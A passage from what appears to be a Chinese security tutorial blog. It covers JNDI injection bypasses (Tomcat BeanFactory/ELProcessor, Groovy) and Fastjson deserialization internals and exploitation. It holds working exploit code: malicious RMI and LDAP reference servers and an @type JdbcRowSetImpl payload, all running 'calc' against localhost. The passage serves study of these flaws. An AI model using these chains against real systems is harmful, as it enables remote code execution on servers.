<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="tomcat8"><a href="#tomcat8" class="headerlink" title="tomcat8"></a>tomcat8</h5><p>在jdk1.8 141到jdk1.8 191之间对rmi增加了上述补丁，但是ldap没有，还是可以用</p>
<p>但是在jdk1.8 191之后就不支持远程对象加载了，但是我们还是可以通过让它来绑定本地的类来达到命令执行的效果，但是这个显然也是需要有一定条件的，原生jdk里面就比较难实现</p>
<p>现在其实加载引用是可以实现，但是无法远程获取工厂，所以就是看有没有依赖的类中存在一个原生的工厂导致可以被利用</p>
<p>主要看实现ObjectFactory接口的类，里面是否满足，通过调用其getObjectInstance来实现命令执行</p>
<p>导入tomcat8依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>这里就需要有tomcat8的依赖，它的依赖里面就存在一个类BeanFactory满足，tomcat其它版本都会有所改变所以可能不行</p>
<p><img src="https://luokuang1.github.io/images/jndi10.png" width="95%" height="80%"></p>
<p>这里看一下为什么它可以被利用，它的getObjectInstance方法里面调用了invoke来反射调用类的方法，具体就可以不用太看，因为有点长，主要看看如何利用</p>
<p>首先到达BeanFactory的getObjectInstance方法，里面先是加载了ELProcessor类</p>
<p><img src="https://luokuang1.github.io/images/jndi11.png" width="95%" height="80%"></p>
<p>这里再进行初始化操作</p>
<p><img src="https://luokuang1.github.io/images/jndi12.png" width="95%" height="80%"></p>
<p>最终跟进invoke方法</p>
<p><img src="https://luokuang1.github.io/images/jndi13.png" width="95%" height="80%"></p>
<p>跟进到了ELProcessor里面，这里再执行危险函数</p>
<p><img src="https://luokuang1.github.io/images/jndi14.png" width="95%" height="80%"></p>
<p>server</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>));</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>,resourceRef);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/jndi15.png" width="95%" height="80%"></p>
<h5 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h5><p>这里在利用tomcat8的依赖下BeanFactory通过ELProcessor被利用外，还可以通过Groovy来实现命令执行</p>
<p>依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;groovy&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.4</span><span class="number">.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>Poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Server_Bypass_Groovy</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=parseClass&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>,script));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;luokuang&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行成功</p>
<p><img src="https://luokuang1.github.io/images/jndi16.png" width="95%" height="80%"></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化</title>
    <url>/2025/02/08/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>相关链接：</p>
<p><a href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a> </p>
<p><a href="https://yyjccc.github.io/2024/04/27/fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87/">https://yyjccc.github.io/2024/04/27/fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87/</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>首先需要介绍一下fastjson的相关知识，fastjson主要通过将一个json格式的文件转为一个java的对象，或者将一个java对象转为一个json格式的对象，但是这里的转化是需要满足一定条件，不是所有的对象都可以直接转为json格式，其中转化的过程就是通过序列化和反序列化，当然这个就与原生的jdk版本没有太多关联，这个属于插件存在的漏洞</p>
<p>导入依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.22</span>&lt;/version&gt; &lt;!-- 请根据需要选择合适的版本 --&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Fastjson的一般用法"><a href="#Fastjson的一般用法" class="headerlink" title="Fastjson的一般用法"></a>Fastjson的一般用法</h3><p>在fastjson进行转换时，必须需要类有一个无参构造方法，最好是通过java bean的格式进行书写，因为如果不是满足java bean则在对json反序列化为对象时可能会出现赋值问题，如果是private或者protected的属性就无法直接进行赋值给反序列化的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        demo1 aa=<span class="keyword">new</span> <span class="title class_">demo1</span>();</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> JSON.toJSONString(aa);</span><br><span class="line">        System.out.println(text);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        demo1 a=JSON.parseObject(<span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;ccc\&quot;&#125;&quot;</span>, demo1.class);</span><br><span class="line">        System.out.println(a.getAge()+<span class="string">&quot; &quot;</span>+a.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果反序列化没有指定为哪个类这里就会默认为一个JSONObjetct类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    JSONObject a=JSON.parseObject(<span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;ccc\&quot;&#125;&quot;</span>);</span><br><span class="line">    System.out.println(a.get(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还有一种方式来进行指定类的类型，通过在序列化时在toJSONString中添加一个SerializerFeature.WriteClassName属性来进行指定，这个是有fastjson版本限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="type">demo1</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo1</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(aa, SerializerFeature.WriteClassName);</span><br><span class="line">    System.out.println(json);</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">aa1</span> <span class="operator">=</span> JSON.parse(json);</span><br><span class="line">    System.out.println(aa1.getClass().getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Fastjson调用流程简单分析"><a href="#Fastjson调用流程简单分析" class="headerlink" title="Fastjson调用流程简单分析"></a>Fastjson调用流程简单分析</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>先是序列化，这里先思考一个问题，属性值是如何获取的属性值的</p>
<p>这里就分为有无getter，如果没有getter方法，它就无法直接获取private属性或者protected属性，如果为public属性它就会看是否赋初始值，如果没有就表示默认值</p>
<p>如果有通过就是通过getter方法来进行获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zzz&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;echo&quot;</span>+<span class="built_in">this</span>.age+<span class="string">&quot;  &quot;</span>+<span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/fastjson1.png" width="95%" height="80%"></p>
<p>这里也是体现了它以getter方法调用优先</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>这里知道序列化的规则，反序列化也是一样</p>
<p>如果没有@type标识的情况下，它就默认为JSONObject，但是如果设置了@type属性又会如何进行实例化一个对象呢</p>
<p><img src="https://luokuang1.github.io/images/fastjson2.png" width="95%" height="80%"></p>
<p>它会先调用构造器，然后通过setter方法来进行对对象进行赋值操作</p>
<h4 id="调试分析-反序列化"><a href="#调试分析-反序列化" class="headerlink" title="调试分析 反序列化"></a>调试分析 反序列化</h4><p>这里先调试parseObject方法</p>
<p><img src="https://luokuang1.github.io/images/fastjson3.png" width="95%" height="80%"></p>
<p>这里跟进去，嵌套了几个parse方法，最后到达DefaultJSONParser的parse方法</p>
<p><img src="https://luokuang1.github.io/images/fastjson4.png" width="95%" height="80%"></p>
<p>跟进到处理左括号这里，进入parseObject来看看它处理json格式字符串的方法，这里就以获取第一个属性为例子，这里它通过scanSymbol方法来获取两个引号之间的字段，其它的字段也是一样</p>
<p><img src="https://luokuang1.github.io/images/fastjson5.png" width="95%" height="80%"></p>
<p>这里跳一下，主要看解析完这个json字符串，它是如何来创建对象的</p>
<p><img src="https://luokuang1.github.io/images/fastjson6.png" width="95%" height="80%"></p>
<p>这里先是获取上述解析出来的信息，然后会进行一次类加载，看看clazz里面有哪些东西</p>
<p><img src="https://luokuang1.github.io/images/fastjson7.png" width="95%" height="80%"></p>
<p>下面就是通过判断是否该类为一个特殊的类，从默认加载器里面进行寻找，如果都没有才会直接进行类加载</p>
<p><img src="https://luokuang1.github.io/images/fastjson8.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/fastjson9.png" width="95%" height="80%"></p>
<p>最后就是反序列化，序列化里面创建了一份黑名单Thread类</p>
<p><img src="https://luokuang1.github.io/images/fastjson10.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/fastjson11.png" width="95%" height="80%"></p>
<p>最后在JavaBeanInfo的build方法里面反射获取setter和getter方法，这里通过特定的条件来进行寻找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法名长度大于<span class="number">4</span>且以set开头，且第四个字母要是大写</span><br><span class="line">非静态方法</span><br><span class="line">返回类型为<span class="keyword">void</span>或当前类</span><br><span class="line">参数个数为<span class="number">1</span>个</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/fastjson12.png" width="95%" height="80%"></p>
<h2 id="反序列化漏洞形成"><a href="#反序列化漏洞形成" class="headerlink" title="反序列化漏洞形成"></a>反序列化漏洞形成</h2><h3 id="简单的反序列化"><a href="#简单的反序列化" class="headerlink" title="简单的反序列化"></a>简单的反序列化</h3><p>在上述的描述下如果在反序列化一个属性值时它会通过调用setter方法来对其进行赋值操作，如果创建一个恶意的set方法这里就可以使其在赋值时调用方法触发恶意代码</p>
<p>恶意的set方法，执行成功</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setter触发&quot;</span>);</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/fastjson13.png" width="95%" height="80%"></p>
<h3 id="Fastjson-lt-1-2-24利用链"><a href="#Fastjson-lt-1-2-24利用链" class="headerlink" title="Fastjson&lt;=1.2.24利用链"></a>Fastjson&lt;=1.2.24利用链</h3><p>这里为什么要以1.2.24为分界，主要因为在Fastjson&lt;=1.2.24的版本里面可以通过@type来进行指定对应的类进行加载</p>
<p>这个版本的jastjson有两条利用链——JdbcRowSetImpl和Templateslmpl</p>
<h4 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h4><p>JdbcRowSetImpl利用链最终的结果是导致JNDI注入，可以结合JNDI的攻击手法进行利用。是通用性最强的利用方式，在以下三种反序列化中均可使用，JDK版本限制和JNDI类似主要通过fastjson来触发jndi</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">parse(jsonStr)</span><br><span class="line">parseObject(jsonStr)</span><br><span class="line">parseObject(jsonStr,Object.class)</span><br></pre></td></tr></table></figure>
<p>这里先看看它是如何联系jndi的，这里是由于JdbcRowSetImpl的connect方法里面调用了lookup方法，所以如果我们可以走到这里就可以成功触发</p>
<p><img src="https://luokuang1.github.io/images/fastjson14.png" width="95%" height="80%"></p>
<p><strong>RMI+JNDI</strong></p>
<p>利用的链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">demo1</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo1</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(aa, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="comment">//        System.out.println(json);</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">aa1</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/luokuang\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恶意服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">                <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>,<span class="string">&quot;http://127.0.0.1:9000/&quot;</span>);</span><br><span class="line">                <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">                Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/luokuang&quot;</span>,refObjWrapper);</span><br><span class="line">                System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>LDAP+JNDI</strong></p>
<p>ldap协议恶意服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:9000/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端</p>
